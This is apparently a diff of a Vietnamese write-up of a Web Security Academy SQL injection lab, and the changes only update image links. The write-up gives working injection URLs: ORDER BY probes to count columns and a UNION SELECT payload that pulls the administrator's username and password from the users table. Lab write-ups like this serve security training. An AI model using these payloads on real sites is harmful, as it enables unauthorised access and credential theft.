@@ -1,4 +1,4 @@
-![[Pasted image 20260530170947.png]]
+![Giao diện lab ban đầu](images/Pasted%20image%2020260530170947.png)
 # Tổng quan về lab
 -Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Corporate gifts thì ta thấy ở url:
 ```LINK
@@ -22,12 +22,12 @@ https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?categor
 https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?category=Corporate+gifts'+ORDER+BY+2--
 ```
 Khi đến `ORDER BY 3---` thì server bị lỗi 
-![[Pasted image 20260531235113.png]]
+![ORDER BY 3 bị lỗi](images/Pasted%20image%2020260531235113.png)
 => câu truy vấn SELECT trước gồm có 2 cột,ta sẽ dùng UNION SELECT 2 cột:
 ```LINK
 https://0adc00c1049a670880b8621d0024005d.web-security-academy.net/filter?category=Corporate+gifts'+UNION+SELECT+username,password+FROM+users+WHERE+username='administrator'--
 ```
 Lúc này,ta đã thấy `administrator` và password của username đó việc còn lại là đăng nhập 
-![[Pasted image 20260531235130.png]]
+![Lấy được username và password của administrator](images/Pasted%20image%2020260531235130.png)
 
 => solved
